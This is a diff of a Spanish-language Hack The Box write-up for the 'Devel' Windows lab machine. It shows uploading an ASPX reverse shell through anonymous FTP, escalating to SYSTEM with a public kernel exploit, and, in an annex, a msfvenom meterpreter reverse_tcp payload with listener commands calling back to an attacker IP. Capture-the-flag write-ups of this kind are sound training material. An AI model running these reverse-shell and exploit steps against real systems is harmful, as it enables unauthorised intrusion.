@@ -1,5 +1,23 @@
- 
-tags: ftp,windows, arbitrary file upload
+ ---
+layout: single
+title: Devel - Hack The Box
+excerpt: "Devel es una maquina windows que se explota mediante un servicio FTP que tiene subida arbitraria de archivos, por medio de esta debilidad, se logra establecer una conexión al equipo victima y ejecutar comandos, luego se logra escalar privilegios por medio de un exploit conocido basado en la versión del sistema operativo."
+date: 2021-10-10
+classes: wide
+header:
+  teaser: /assets/images/htb-writeup-devel/devel-logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
+categories:
+  - hackthebox
+tags:
+  - ftp
+  - windows
+  - arbitrary file upload
+---
+
+![](/assets/images/htb-writeup-devel/devel-logo.png)
+
 
 Esta es una maquina de nivel facil segun hack the box, donde por medio de un servicio FTP se logra subir archivos que permiten ganar acceso al sistema.
 
@@ -41,19 +59,18 @@ Nos conectamos al servicio FTP
 ftp 10.10.10.5
 ```
 y observamos 3 archivos
-
-*********devel1.png*********
+![](/assets/images/htb-writeup-devel/devel1.png)
 
 Si navegamos por el puerto 80, veremos la imagen clasica del servicio IIS de windows, sin embargo, al entrar al servicio FTP está la misma imagen (welcome.png) que nos muestra mediante el puerto 80. Por lo que una vía pontencial de explotación es intentar subir una reverse shell.
 
 Buscando en internet "aspx reverse shell github" encontramos una que nos sirve
-*********devel2.png*********
+![](/assets/images/htb-writeup-devel/devel2.png)
 
 por lo que la descargamos en nuestra maquina de atacante 
-*********devel3.png*********
+![](/assets/images/htb-writeup-devel/devel3.png)
 
 y cambiamos la IP y puerto local a la que nos queremos conectar.
-*********devel6.png*********
+![](/assets/images/htb-writeup-devel/devel6.png)
 
 ahora, nos conectamos al servicio FTP (FTP IP-VICTIMA) y ejecutamos el siguiente comando para subir nuestra shell que acabamos de descargar
 ```
@@ -61,13 +78,13 @@ put shell.aspx
 ```
 
 una vez subida, nos tendremos que poner en escucha con netcat
-*********devel7.png*********
+![](/assets/images/htb-writeup-devel/devel7.png)
 
 y ejecutamos el archivo que subimos desde la web
-*********devel5.png*********
+![](/assets/images/htb-writeup-devel/devel5.png)
 
 y ya logramos ganar acceso al sistema
-********devel4.png*********
+![](/assets/images/htb-writeup-devel/devel4.png)
 
 
 # Escalación de privilegios
@@ -77,10 +94,10 @@ systeminfo
 ```
 
 Según la información del SO, estamos ante un Windows 7 6.1.7600
-********devel8.png*********
+![](/assets/images/htb-writeup-devel/devel8.png)
 
 buscando en internet un exploit para esta versión, encontramos uno, asi que vamos a probarlo 
-********devel9.png*********
+![](/assets/images/htb-writeup-devel/devel9.png)
 
 Para ejecutar este exploit, primero necesita ser compilado, en caso de que no tengas la utilidad *mingw-w64* (la cual sirve para compilar exploits de windows en linux) puedes instalarla con el siguiente comando
 ```
@@ -88,20 +105,17 @@ sudo apt-get install mingw-w64
 ```
 
 ahora solo queda subir el exploit mediante FTP y ejecutarlo en la maquina victima. Nota: cuando ingresemos por FTP, debemos ejecutar el comando "binary" dado que se suelen perder datos de archivos al subirlo, con este comando hacemos que se suba intacto.
-********devel10.png*********
+![](/assets/images/htb-writeup-devel/devel10.png)
 
-una vez subido, nos dirigimos a la ruta C:\inetpub\wwwroot y ejecutamos el exploit que acabamos de subir
-********devel10.png*********
-
-una vez hecho esto, somos el usuario **nt authority\system**
+una vez subido, nos dirigimos a la ruta C:\inetpub\wwwroot y ejecutamos el exploit que acabamos de subir, y nos convertimos en el usuario **nt authority\system**
+![](/assets/images/htb-writeup-devel/devel11.png)
 
 
 
 
+# Anexos
 
-# Anexos (alternativas para ganar acceso)
-
-##shell con metasploit
+## shell con metasploit
 creamos el payload
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.6 lport=4444 -f aspx -o shell.aspx
@@ -111,12 +125,12 @@ nos ponemos en escucha
 1. ```msfconsole```
 2. ```use exploit/multi/handler```
 3. ```set payload windows/meterpreter/reverse_tcp```
-4. ```set lhost 10.10.16.6
-5. ```set lport 1234
+4. ```set lhost 10.10.16.6```
+5. ```set lport 1234```
 6. ```run```
 
 
-# Pseudo consola para ejecución de comandos
+## Pseudo consola para ejecución de comandos
 Parrot y Kali linux traen una pseudo consola para en lenguaje aspx que nos permite ejecutar comandos, para encontrla podemos escribir el siguiente comando
 ```
 locate cmdasp.aspx
